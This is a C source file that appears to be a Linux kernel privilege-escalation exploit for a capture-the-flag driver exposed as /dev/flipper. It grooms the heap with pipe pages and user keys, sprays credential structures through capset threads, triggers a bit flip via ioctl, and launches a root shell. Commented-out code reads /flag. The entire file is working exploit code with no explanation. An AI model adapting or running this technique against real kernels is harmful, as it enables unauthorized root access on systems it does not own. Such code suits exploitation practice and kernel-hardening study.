#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/timerfd.h>
#include <pthread.h>
#include <linux/keyctl.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)


#define o(x) (kbase + x)


unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        die("SYSCHK error."); \
    __res;                        \
})

size_t kbase;

#include <sys/capability.h>

#define CMD_ALLOC 0x13370000
#define CMD_FLIP  0x13370001

#define SPRAY_THREAD_NUM 40
#define PIPE_SPRAY_NUM 0x80

struct workflow {
    int pthread_create_done;
    int cross_fengshui_done;
    int spray_cred_done;
    int set_refcont_done;
    int alloc_vuln_done;
    int overflow_done;
    int free_cred_done;
    int free_useless_threads_done;
    int spray_su_done;
};

struct rcu_head {
    void *next;
    void *func;
};

struct user_key_payload {
    struct rcu_head rcu;
    unsigned short datalen;
    char *data[];
};

struct workflow *wf;
pthread_mutex_t t_mutex = PTHREAD_MUTEX_INITIALIZER;

int pipefds[PIPE_SPRAY_NUM][2];
unsigned char *tmp_buf;
int shm_id;

typedef int32_t key_serial_t;

static inline key_serial_t key_alloc(char* description, char* payload, int payload_len)
{
    return syscall(
        __NR_add_key,
        "user",
        description,
        payload,
        payload_len,
        KEY_SPEC_PROCESS_KEYRING
    );
}

static inline key_serial_t key_read(int key_id, char *retbuf, int retbuf_len)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_READ,
        key_id,
        retbuf,
        retbuf_len
    );
}

static inline key_serial_t key_revoke(int key_id)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_REVOKE,
        key_id,
        0,
        0,
        0
    );
}

int spray_key(int id, char *buff, size_t size) {
    char desc[256] = {0};
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff) memset(payload, id, size);

    key = key_alloc(desc, payload, size);

    if (key < 0) {
        perror("[X] add_key()");
        return -1;
    }

    return key;
}


void do_nothing() {
    while(wf->overflow_done == 0) {
        usleep(1000);
    }

    pthread_mutex_lock(&t_mutex);
    wf->free_cred_done ++;
    pthread_mutex_unlock(&t_mutex);

}


void wait_and_su() {
    while(wf->free_useless_threads_done <5) {
        usleep(1000);
    }
    bind_cpu(0);
    // logd("spraying su cred");
    system("/tmp/dummy");
    
    while (1)
    {
        sleep(1);
    }
    
}


void set_cap() {
    struct __user_cap_header_struct cap_header;
    struct __user_cap_data_struct   cap_data;
    int my_id;
    cap_header.pid = gettid() ;
    cap_header.version = _LINUX_CAPABILITY_VERSION_1;

    if( capget(&cap_header, &cap_data) < 0)
    {
        die("capget");
        exit(1);
    }

    cap_data.effective = 0x0;
    cap_data.permitted = 0x0;
    cap_data.inheritable = 0x0;

    while (wf->cross_fengshui_done == 0)
    {
        usleep(1000);
    }

    pthread_mutex_lock(&t_mutex);
    // logd("spraying cred\n");
    bind_cpu(0);
    if (capset(&cap_header, &cap_data) < 0) {
        pthread_mutex_unlock(&t_mutex);
        die("capset");
        exit(1);
    }

    my_id = wf->spray_cred_done;
    wf->spray_cred_done ++;
    pthread_mutex_unlock(&t_mutex);

    while(wf->alloc_vuln_done == 0) {
        usleep(1000);
    }
    pthread_t thread_pids[2];
    pthread_create(&thread_pids[0], NULL, (void *)do_nothing, NULL);
    pthread_create(&thread_pids[1], NULL, (void *)do_nothing, NULL);

    // logd("spawn 2 threads");

    pthread_mutex_lock(&t_mutex);
    wf->set_refcont_done ++; 
    pthread_mutex_unlock(&t_mutex);
    // wait until all creds are sprayed

    while(wf->free_cred_done < 2*SPRAY_THREAD_NUM) {
        usleep(1000);
    }

    if(my_id < 5) {
        wf->free_useless_threads_done ++;
    }
    else {
        sleep(15);
    }
}

void wait_and_setcap() {
    bind_cpu(0);
    set_cap();
    // setuid(0);
    if (geteuid() == 0) {
        printf("getuid() == 0\n");
        // if (fork() == 0) {
        //     setuid(0);
        //     logi("GET R00T!!!");
        //     int fd = open("/flag", O_RDONLY);
        //     if (fd < 0) {
        //         die("open");
        //         exit(1);
        //     }
        //     char buf[0x100];
        //     read(fd, buf, 0x100);
        //     write(1, buf, 0x100);
        // }
        // else {
        //     while(1) {
        //         sleep(1);
        //     }
        // }
        setuid(0);
        system("/bin/sh");
        while(1) {
            sleep(1);
        }
    }
}

void spray_pipe() {
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (pipe(pipefds[i]) < 0) {
            die("pipe");
            exit(1);
        }
    }
}

int main()
{
    saveStatus();
    int i, victim_fd = -1;
    int fd = open("/dev/flipper", O_RDONLY);
    if(fd < 0) die("Error open");

    tmp_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    shm_id = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0666);
    if (shm_id < 0) {
        die("shmget");
        exit(1);
    }
    wf = (struct workflow *)shmat(shm_id, NULL, 0);
    if (wf == (void *)-1) {
        die("shmat");
        exit(1);
    }

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy\n");
    system("chmod +x /tmp/dummy");

    pthread_t thread_pids[SPRAY_THREAD_NUM];
    for (int i = 0; i < SPRAY_THREAD_NUM; i++) {
        pthread_create(&thread_pids[i], NULL, (void *)wait_and_setcap, NULL);
    }
    logd("pthread create done 1");

    #define SPRAY_SU_NUM 0x20
    pthread_t su_pids[SPRAY_SU_NUM];
    for (int i = 0; i < SPRAY_SU_NUM; i++) {
        pthread_create(&su_pids[i], NULL, (void *)wait_and_su, NULL);
    }
    printf("pthread create done 2\n");

    wf->pthread_create_done = 1;

    bind_cpu(0);
    spray_pipe(); 
    logd("add pipe pages");
    sleep(2);

    for(int i = 0; i < PIPE_SPRAY_NUM; i++) {
        write(pipefds[i][1], tmp_buf, 0x1000);
    }

    logd("close even pipes");
    for(int i = 0x20 + 1; i < PIPE_SPRAY_NUM; i+=2) {
        close(pipefds[i][1]);
        close(pipefds[i][0]);
    }

    wf->cross_fengshui_done = 1;

    // waiting for spraying cred
    while(wf->spray_cred_done < SPRAY_THREAD_NUM) {
        usleep(1000);
    }
    memset(tmp_buf, 0x41, 0x1000);

    logd("close odd pipes");
    for(int i = 0x20; i < PIPE_SPRAY_NUM; i+=2) {
        close(pipefds[i][1]);
        close(pipefds[i][0]);
    }

    for(int i = 0; i < 15; i++) {
        spray_key(i, tmp_buf, 0x81);
    }

    ioctl(fd, CMD_ALLOC, 0xc0);

    for(int i = 15; i < 103; i++) {
        spray_key(i, tmp_buf, 0x81);
    }

    wf->alloc_vuln_done = 1;

    while(wf->set_refcont_done < SPRAY_THREAD_NUM) {
        usleep(1000);
    }
    logd("trigger vuln");
    ioctl(fd, CMD_FLIP, (0x1000<<3)|1);
    // getchar();

    wf->overflow_done = 1;

    getchar();
}